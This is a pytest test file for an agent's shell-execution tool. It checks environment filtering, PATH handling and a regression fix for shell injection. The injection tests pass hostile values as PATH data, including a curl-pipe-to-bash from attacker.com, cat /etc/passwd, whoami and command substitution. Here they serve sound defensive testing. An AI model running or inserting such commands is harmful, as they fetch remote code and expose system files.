import json
import shlex
import sys

import pytest

from nanobot.agent.tools.exec_session import ExecSessionManager
from nanobot.agent.tools.shell import ExecTool

_UNIX_ONLY = pytest.mark.skipif(sys.platform == "win32", reason="Unix shell commands")


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "allowed_env_keys, expected_allowed",
    [
        pytest.param(None, None, id="default-filtering"),
        pytest.param(
            ["MY_CUSTOM_VAR", "NONEXISTENT_VAR_12345"],
            "hello-from-config",
            id="configured-passthrough",
        ),
    ],
)
@pytest.mark.parametrize(
    "command_mode", [pytest.param("shell", marks=_UNIX_ONLY), "argv"],
)
async def test_exec_child_receives_filtered_env(monkeypatch, allowed_env_keys, expected_allowed, command_mode):
    monkeypatch.setenv("MY_CUSTOM_VAR", "hello-from-config")
    monkeypatch.setenv("NANOBOT_SECRET_TOKEN", "super-secret-value")
    monkeypatch.delenv("NONEXISTENT_VAR_12345", raising=False)
    marker = "ENV_PROBE_COMPLETE "
    script = (
        "import json, os; "
        "keys = ['MY_CUSTOM_VAR', 'NANOBOT_SECRET_TOKEN', 'NONEXISTENT_VAR_12345']; "
        f"print({marker!r} + json.dumps({{key: os.environ.get(key) for key in keys}}))"
    )
    argv = [sys.executable, "-c", script]
    command = shlex.join(argv) if command_mode == "shell" else argv
    manager = ExecSessionManager()
    tool = ExecTool(allowed_env_keys=allowed_env_keys, session_manager=manager)
    try:
        result = await tool.execute(command=command)
    finally:
        await manager.close_all()

    assert not getattr(result, "is_error", False), result
    assert "Exit code: 0" in result
    completed = [line.removeprefix(marker) for line in result.splitlines() if line.startswith(marker)]
    assert len(completed) == 1, result
    assert json.loads(completed[0]) == {
        "MY_CUSTOM_VAR": expected_allowed,
        "NANOBOT_SECRET_TOKEN": None,
        "NONEXISTENT_VAR_12345": None,
    }


@pytest.mark.asyncio
async def test_exec_has_working_path():
    tool = ExecTool()
    result = await tool.execute(command="echo hello", yield_time_ms=10000)
    assert "hello" in result


@_UNIX_ONLY
@pytest.mark.asyncio
async def test_exec_path_append():
    tool = ExecTool(path_append="/opt/custom/bin")
    result = await tool.execute(command="echo $PATH")
    assert "/opt/custom/bin" in result


@_UNIX_ONLY
@pytest.mark.asyncio
async def test_exec_path_append_preserves_system_path():
    tool = ExecTool(path_append="/opt/custom/bin")
    result = await tool.execute(command="ls /")
    assert "Exit code: 0" in result


@_UNIX_ONLY
@pytest.mark.asyncio
async def test_exec_path_prepend_takes_lookup_precedence(tmp_path):
    preferred = tmp_path / "preferred"
    fallback = tmp_path / "fallback"
    preferred.mkdir()
    fallback.mkdir()
    preferred_tool = preferred / "pathprobe"
    fallback_tool = fallback / "pathprobe"
    preferred_tool.write_text("#!/bin/sh\necho preferred\n", encoding="utf-8")
    fallback_tool.write_text("#!/bin/sh\necho fallback\n", encoding="utf-8")
    preferred_tool.chmod(0o755)
    fallback_tool.chmod(0o755)

    tool = ExecTool(path_prepend=str(preferred), path_append=str(fallback))
    result = await tool.execute(command="pathprobe")

    assert "preferred" in result
    assert "fallback" not in result


@_UNIX_ONLY
@pytest.mark.asyncio
@pytest.mark.parametrize(
    "malicious_path",
    [
        '/tmp/bin; echo INJECTED',
        '/tmp/bin; echo $(whoami)',
        "/tmp/bin; echo `id`",
        '/tmp/bin; cat /etc/passwd',
        '/tmp/bin && curl http://attacker.com/shell.sh | bash',
        '/tmp/bin\necho INJECTED',
        '/tmp/bin; rm -rf /tmp/test_inject_marker; echo CLEANED',
    ],
)
async def test_exec_path_append_shell_metacharacters_not_executed(malicious_path, tmp_path):
    """Shell metacharacters in path_append must NOT be interpreted as commands.

    Regression test for: path_append was previously concatenated into a shell
    command string via f'export PATH="$PATH:{path_append}"; {command}', which
    allowed shell injection.  After the fix, path_append is passed through the
    env dict so metacharacters are treated as literal path characters.
    """
    tool = ExecTool(path_append=malicious_path)
    result = await tool.execute(command="echo SAFE_OUTPUT")

    assert "SAFE_OUTPUT" in result

    assert "INJECTED" not in result
    assert "root:" not in result


@_UNIX_ONLY
@pytest.mark.asyncio
async def test_exec_path_append_command_substitution_does_not_execute(tmp_path):
    """$() in path_append must not trigger command substitution.

    We create a marker file and try to read it via $(cat ...).  If command
    substitution works, the marker content appears in output.
    """
    marker = tmp_path / "secret_marker.txt"
    marker.write_text("SHOULD_NOT_APPEAR")

    tool = ExecTool(
        path_append=f'/tmp/bin; echo $(cat {marker})',
    )
    result = await tool.execute(command="echo OK")

    assert "OK" in result
    assert "SHOULD_NOT_APPEAR" not in result
